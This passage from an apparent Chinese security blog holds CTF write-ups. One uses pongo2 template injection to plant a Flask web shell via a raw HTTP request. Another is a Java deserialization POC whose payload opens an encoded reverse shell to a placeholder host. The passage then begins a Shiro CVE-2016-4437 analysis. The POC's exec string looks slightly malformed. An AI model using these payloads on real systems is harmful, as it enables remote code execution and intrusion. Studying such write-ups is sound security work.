alt="image-20240327200832964"></p><p><strong>pongo2模板注入</strong></p><p>&#x2F;flask?name&#x3D;&#x2F;，引发报错拿到flask源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&#x27;no ssti&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个程序设置了debug&#x3D;True，说明程序开启了热加载功能，代码在更改后会自动重新加载程序，这意味着我们对代码进行更改后就会立即生效，debug模式下的热加载替换flask源码实现RCE，要用到SaveUploadedFile方法实现任意文件写<code>&#123;&#123;c.SaveUploadedFile(c.FormFile("file"),"/app/server.py")&#125;&#125;</code></p><blockquote><p>但这里要注意参数经过 html.EscapeString(name) 转义，会将双引号转义掉，所以要换一种方式，对于”file”，gin.Context还提供了另一种方法，HandlerName() 方法，用于返回主处理程序的名称，这里返回的就是admin&#x2F;route.Admin，然后可以用过滤器last获取最后一个字符串。对于 “&#x2F;app&#x2F;server.py”，可以在请求头中将Referer字段设置成 “&#x2F;app&#x2F;server.py”，然后用 Request.Referer()方法获取Referer的值。（还有其他方法，如Request.Host()、Request.UA()等）</p><p>因为要从Referer头中获取源码路径，故添加Referer: &#x2F;app&#x2F;server.py，且上传文件提交表单需要Content-Type 请求，同时需要边界字符串分割（可自定义），故添加Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundary8ALIn5Z2C3VlBqND</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125;&#125; HTTP/1.1</span><br><span class="line">Host: 859997a4-b46a-4a5c-b034-448e90505aa5.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Referer: /app/server.py</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND</span><br><span class="line">Cookie: session-name=MTcxMTUzODU2MXxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXyB-2MEmWBEhT2LmkrXFrKm9hHzDFKVLoIWHcrKauUlWQ==</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 429</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8ALIn5Z2C3VlBqND</span><br><span class="line">Content-Disposition: form-data; name=&quot;n&quot;; filename=&quot;1.py&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    name = request.args[&#x27;name&#x27;]</span><br><span class="line">    file=os.popen(name).read()</span><br><span class="line">    return file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)</span><br><span class="line">------WebKitFormBoundary8ALIn5Z2C3VlBqND--</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240327194437758.png" alt="image-20240327194437758"></p><p>Fianl，&#x2F;flask?name&#x3D;?name&#x3D;env</p><h2 id="deserbug"><a href="#deserbug" class="headerlink" title="deserbug"></a>deserbug</h2><p>题型：Java反序列化 C</p><p>附件中可以看到两个依赖，分别是<code>common-colletions-3.2.2</code>和<code>hutool-all-5.8.18</code></p><p><code>CC3.2.2</code>，比<code>CC3.1.1</code>多了一个<code>checkUnsafeSerialization</code>函数，对序列化的类进行了检查，禁止一些类的序列化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WhileClosure</span><br><span class="line">CloneTransformer</span><br><span class="line">ForClosure</span><br><span class="line">InstantiateFactory</span><br><span class="line">InstantiateTransformer</span><br><span class="line">InvokerTransformer</span><br><span class="line">PrototypeCloneFactory</span><br><span class="line">PrototypeSerializationFactory</span><br></pre></td></tr></table></figure><p>源码，MyExpect类，Testapp类</p><p>MyExpect.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myexpect</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> Class[] typeparam;</span><br><span class="line">  <span class="keyword">private</span> Object[] typearg;</span><br><span class="line">  <span class="keyword">private</span> Class targetclass;</span><br><span class="line">  <span class="keyword">public</span> String name;</span><br><span class="line">  <span class="keyword">public</span> String anyexcept;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Class <span class="title function_">getTargetclass</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.targetclass;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTargetclass</span><span class="params">(Class targetclass)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.targetclass = targetclass;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> Object[] getTypearg() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.typearg;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTypearg</span><span class="params">(Object[] typearg)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.typearg = typearg;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">getAnyexcept</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> <span class="built_in">this</span>.targetclass.getConstructor(<span class="built_in">this</span>.typeparam);</span><br><span class="line">    <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.typearg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAnyexcept</span><span class="params">(String anyexcept)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.anyexcept = anyexcept;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> Class[] getTypeparam() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.typeparam;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTypeparam</span><span class="params">(Class[] typeparam)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.typeparam = typeparam;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Testapp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.ContentType;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.HttpUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.server.HttpServerRequest;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.http.server.HttpServerResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Testapp</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    HttpUtil.createServer(<span class="number">8888</span>)</span><br><span class="line">      .addAction(<span class="string">&quot;/&quot;</span>, (request, response) -&gt; &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">bugstr</span> <span class="operator">=</span> request.getParam(<span class="string">&quot;bugstr&quot;</span>);</span><br><span class="line">          <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">          <span class="keyword">if</span> (bugstr == <span class="literal">null</span>)</span><br><span class="line">            response.write(<span class="string">&quot;welcome,plz give me bugstr&quot;</span>, ContentType.TEXT_PLAIN.toString()); </span><br><span class="line">          <span class="keyword">try</span> &#123;<span class="comment">// base64解码转化为对象流后直接进行了readObject</span></span><br><span class="line">            <span class="type">byte</span>[] decode = Base64.getDecoder().decode(bugstr);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));</span><br><span class="line">            <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> inputStream.readObject();</span><br><span class="line">            result = object.toString();</span><br><span class="line">          &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">            myexpect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;);</span><br><span class="line">            myexpect.setTypearg((Object[])<span class="keyword">new</span> <span class="title class_">String</span>[] &#123; e.toString() &#125;);</span><br><span class="line">            myexpect.setTargetclass(e.getClass());</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">              result = myexpect.getAnyexcept().toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">              result = ex.toString();</span><br><span class="line">            &#125; </span><br><span class="line">          &#125; </span><br><span class="line">          response.write(result, ContentType.TEXT_PLAIN.toString());</span><br><span class="line">        &#125;).start();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>getAnyexcept()</code>方法中存在类实例化的条件，这与某条CC链中，要使用<code>InstantiateTransformer#transform</code>中的代码类似，再看Web页面接收<code>bugstr</code>参数，经过base64解码转化为对象流后直接进行了<code>readObject</code>进行反序列化，因此这里肯定是要通过<code>CC链+getAnyexcept()</code>来触发漏洞</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240402100901230.png" alt="image-20240402100901230"></p><p>提示：<code>cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</code></p><p>通过<code>hutools.put</code>返回能够触发<code>getAnyexcept</code>，通过这里就可以串起<code>CC</code>链子，<code>getAnyexcept</code>实例化<code>TrAXFilter</code>，接而触发<code>templates</code>加载字节码触发RCE</p><p><code>LazyMap</code>中，<code>LazyMap#get</code>是可以触发<code>map.put</code> 方法从而触发<code>cn.hutool.json.JSONObject.put</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject()-&gt;HashMap#hash()-&gt;TiedMapEntry#hashCode()-&gt;TiedMapEntry#getValue()-&gt;LazyMap#get()-&gt;cn.hutool.json.JSONObject.put()-&gt;Myexpect#getAnyexcept()-&gt;TrAXFilter#constructor()-&gt;TemplatesImpl#newTransformer()-&gt;Runtime.exec()</span><br></pre></td></tr></table></figure><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getTemplates();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">        myexpect.setTargetclass(TrAXFilter.class);</span><br><span class="line">        myexpect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">        myexpect.setTypearg(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span>  <span class="operator">=</span> (LazyMap) LazyMap.decorate(jsonObject, transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap , <span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;2&quot;</span>);</span><br><span class="line">        jsonObject.remove(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFieldValue(transformer, <span class="string">&quot;iConstant&quot;</span>, myexpect);</span><br><span class="line">        <span class="type">byte</span>[] serbyte =serialize(hashMap);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serbyte));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dField</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        dField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dField.set(obj, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplates() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">template</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Chiikawa&quot;</span>);</span><br><span class="line">        template.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">block</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC92cHMtaXAvNjY2NiAwPiYgMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;)\&quot;)&quot;</span>;</span><br><span class="line">        template.makeClassInitializer().insertBefore(block);</span><br><span class="line">        <span class="keyword">return</span> template.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>URL编码下</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240328093825290.png" alt="image-20240328093825290"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240328093707725.png" alt="image-20240328093707725"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro 1.2.4反序列化漏洞(CVE-2016-4437)</title>
      <link href="/2023/12/12/vuln/2016%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/12/12/vuln/2016%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="Shiro-1-2-4反序列化漏洞-CVE-2016-4437"><a href="#Shiro-1-2-4反序列化漏洞-CVE-2016-4437" class="headerlink" title="Shiro 1.2.4反序列化漏洞(CVE-2016-4437)"></a>Shiro 1.2.4反序列化漏洞(CVE-2016-4437)</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p><p>Shiro1.2.4：<a href="https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4">https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4</a></p><p>编辑 shiro&#x2F;web 目录下的 pom.xml，将 jstl 的版本修改为1.2</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>IDEA导入 mvn 项目，配置 tomcat 环境</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231205101411888.png" alt="image-20231205101411888"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>根据漏洞描述，Shiro≤1.2.4 版本默认使用 <code>CookieRememberMeManager</code>，当获取用户请求时，大致的关键处理过程如下：</p><ul><li>获取Cookie中rememberMe的值</li><li>对rememberMe进行Base64解码</li><li>使用AES进行解密</li><li>对解密的值进行反序列化</li></ul><p>由于AES加密的Key是硬编码的默认Key，因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，当 <code>CookieRememberMeManager</code> 对恶意的 <code>rememberMe</code> 进行以上过程处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞</p><h4 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h4><p>勾选 Remember Me</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231205101643436.png" alt="image-20231205101643436"></p><p>服务器会返回一个 rememberMe Cookie</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231214125301319.png" alt="image-20231214125301319"></p><p>之后的请求也会带上这个Cookie</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231214125953937.png" alt="image-20231214125953937"></p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>查找 Cookie 相关操作类</p><p><code>CookieRememberMeManager</code> 类里有序列化和get序列化的方法</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231205103248426.png" alt="image-20231205103248426"></p><p><code>getRememberedSerializedIdentity()</code> 查找调用</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231205110514011.png" alt="image-20231205110514011"></p><p><code>convertBytesToPrincipals()</code> 执行解密和反序列化</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231213205617059.png" alt="image-20231213205617059"></p><p><code>deserialize()</code> [DefaultSerializer类中]</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231213210057241.png" alt="image-20231213210057241"></p><h5 id="解密分析"><a href="#解密分析" class="headerlink" title="解密分析"></a>解密分析</h5><p><code>decrypt()</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231213210500464.png" alt="image-20231213210500464"></p><p>接口</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231213210819166.png" alt="image-20231213210819166"></p><p>找到 <code>decryptionCipherKey</code> 赋值的地方 </p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231213212312047.png" alt="image-20231213212312047"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231213212048131.png" alt="image-20231213212048131"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231213212151238.png" 